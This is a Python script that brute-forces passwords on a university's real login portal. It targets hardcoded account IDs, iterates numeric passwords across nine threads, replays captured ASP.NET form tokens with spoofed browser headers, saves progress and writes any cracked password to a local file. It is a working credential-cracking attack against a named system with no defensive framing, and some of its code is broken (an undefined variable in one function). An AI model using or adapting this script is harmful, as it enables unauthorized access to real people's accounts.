#coding=UTF-8
import requests
import threading
import time
custhead = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0', \
            'Accept': r'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', \
                                                                        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3', \
            'Accept-Encoding': 'gzip, deflate', \
            'Referer': r'http://jwgl.cust.edu.cn/teachwebsl/login.aspx', \
            'Cookie': 'route=0dbce5ed847d16eb040ea267424ec1e8', \
            'Upgrade-Insecure-Requests': '1' , \
            'Cache-Control': 'max-age=0'\
            }
def get_vaild_data():
    from bs4 import BeautifulSoup
    html = requests.post('http://jwgl.cust.edu.cn/teachwebsl/login.aspx', headers=custhead, data={\
                'txtUserName':"2015002922", \
                'txtPassWord': i, \
                'Button1': "登录"    \
            }).content
    bsObj = BeautifulSoup(html)
    stats = bsObj.find(id='__VIEWSTATE').attrs['value']
    vaild = bsObj.find(id='__EVENTVALIDATION').attrs['value']
    html = requests.post('http://jwgl.cust.edu.cn/teachwebsl/login.aspx', headers=custhead, data={\
                'txtUserName':"2015002922", \
                'txtPassWord': i, \
                'Button1': "登录" , \
                '__VIEWSTATE':stats, \
                '__EVENTVALIDATION':vaild\
            }).content
    bsObj = BeautifulSoup(html)
    return bsObj.find(id='__VIEWSTATE').attrs['value'], bsObj.find(id='__EVENTVALIDATION').attrs['value']
def Crack_cust_in(begin, end, flage):
    for i in range(int(begin), int(end)):
        post = requests.Session()
        post = post.post('http://jwgl.cust.edu.cn/teachwebsl/login.aspx', headers=custhead, data={\
            '__VIEWSTATE':"/wEPDwUJMTQyNDg3OTM5D2QWAgIDD2QWAgIFDw8WAh4EVGV4dAUb55So5oi35ZCN5oiW5a+G56CB6ZSZ6K+v77yBZGRk", \
            '__EVENTVALIDATION':"/wEWBAKhsPLHAgKl1bKzCQK1qbSWCwKM54rGBg==", \
            'txtUserName':"2003800026", \
            'txtPassWord': i, \
            'Button1': "登录"    \
        })
        if post.headers['X-AspNet-Version'] == '1.1.4322':
            print('Finding', i, flush=True)
            fp = open(r'D:\computer17\great.txt', 'w')
            fp.write('The password:'+str(i))
            fp.close()
            break
        if (i / 1000).is_integer():
            print(i, flush=True)
            process_saver(flage, i)
def read_save_progress():
    data = []
    for i in range(1, 10):
        fp = open(r'D:\computer17\save'+'\\'+str(i) + '.txt', 'r')
        data.append(fp.read())
        fp.close()
    return data
def process_saver(i, process):
    fp = open(r'D:\computer17\save'+'\\'+str(i) + '.txt', 'w')
    fp.write(str(process))
    fp.close()
def Test_and_run():
    post = requests.post('http://jwgl.cust.edu.cn/teachwebsl/login.aspx', headers=custhead, data={\
        '__VIEWSTATE':"/wEPDwUJMTQyNDg3OTM5D2QWAgIDD2QWAgIFDw8WAh4EVGV4dAUb55So5oi35ZCN5oiW5a+G56CB6ZSZ6K+v77yBZGRk", \
        '__EVENTVALIDATION':"/wEWBAKhsPLHAgKl1bKzCQK1qbSWCwKM54rGBg==", \
        'txtUserName':"2003800026", \
        'txtPassWord': '963976121', \
        'Button1': "登录"    \
    })
    try:
        a = post.headers['X-AspNet-Version'] == '1.1.4322'
        for i in enumerate(read_save_progress()):
            threading.Thread(target=Crack_cust_in, args=(i[1], (i[0]+2) *100000000, i[0]+1)).start()
    except:
        print('Error')
Test_and_run()